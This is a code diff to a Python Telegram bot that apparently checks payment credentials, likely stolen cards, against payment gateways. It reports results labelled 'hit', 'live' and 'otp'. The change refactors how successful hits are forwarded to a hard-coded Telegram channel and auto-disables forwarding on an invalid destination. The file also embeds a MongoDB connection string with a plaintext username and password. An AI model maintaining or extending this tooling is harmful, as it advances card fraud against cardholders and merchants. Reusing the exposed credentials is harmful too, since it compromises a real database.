@@ -38,6 +38,7 @@ MONGO_URL = os.getenv(
     "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"
 )
 HIT_CHANNEL = -1003805693108  # Channel for forwarding hits
+HIT_CHANNEL_FORWARDING_ENABLED = bool(HIT_CHANNEL)
 
 # Constants
 MAX_SITES_PER_USER = 500
@@ -675,6 +676,30 @@ def run_gateway_keycheck(submit_resp, receipt_resp=None):
 
     fallback_message = error_msg or error_code or submit_type or receipt_type or 'NO_RESPONSE'
     return {'status': 'UNKNOWN', 'message': fallback_message}
+
+async def forward_hit_message_to_channel(formatted_message, hit_status):
+    """Forward approved results to HIT_CHANNEL with auto-disable on invalid peer."""
+    global HIT_CHANNEL_FORWARDING_ENABLED
+    if not HIT_CHANNEL_FORWARDING_ENABLED or not HIT_CHANNEL or hit_status not in ['hit', 'live', 'otp']:
+        return
+
+    try:
+        await asyncio.sleep(0.3)
+        await app.send_message(
+            chat_id=HIT_CHANNEL,
+            text=formatted_message,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+    except Exception as channel_error:
+        err_text = str(channel_error)
+        if "PEER_ID_INVALID" in err_text.upper() or "CHAT_ID_INVALID" in err_text.upper():
+            HIT_CHANNEL_FORWARDING_ENABLED = False
+            logger.error(
+                f"Disabled HIT_CHANNEL forwarding due to invalid destination {HIT_CHANNEL}: {channel_error}"
+            )
+            return
+        logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
 
 def should_retry_mchk_last_response(success, response_text):
     """Retry only transient/unfinished mass-check failures."""
@@ -2324,17 +2349,7 @@ by @still_alivenow"""
                         parse_mode=ParseMode.HTML,
                         disable_web_page_preview=True
                     )
-                    if HIT_CHANNEL and hit_status in ['hit', 'live', 'otp']:
-                        try:
-                            await asyncio.sleep(0.3)
-                            await app.send_message(
-                                chat_id=HIT_CHANNEL,
-                                text=formatted_message,
-                                parse_mode=ParseMode.HTML,
-                                disable_web_page_preview=True
-                            )
-                        except Exception as channel_error:
-                            logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
+                    await forward_hit_message_to_channel(formatted_message, hit_status)
                 except Exception as e:
                     logger.error(f"Error sending message to user {user_id}: {e}")
                     # Fallback to plain text to avoid HTML parsing failures.
@@ -2361,17 +2376,7 @@ by @still_alivenow"""
                             parse_mode=ParseMode.HTML,
                             disable_web_page_preview=True
                         )
-                        if HIT_CHANNEL and hit_status in ['hit', 'live', 'otp']:
-                            try:
-                                await asyncio.sleep(0.3)
-                                await app.send_message(
-                                    chat_id=HIT_CHANNEL,
-                                    text=formatted_message,
-                                    parse_mode=ParseMode.HTML,
-                                    disable_web_page_preview=True
-                                )
-                            except Exception as channel_error:
-                                logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
+                        await forward_hit_message_to_channel(formatted_message, hit_status)
                     
                     except Exception as e:
                         logger.error(f"Error sending hit message to user {user_id}: {e}")
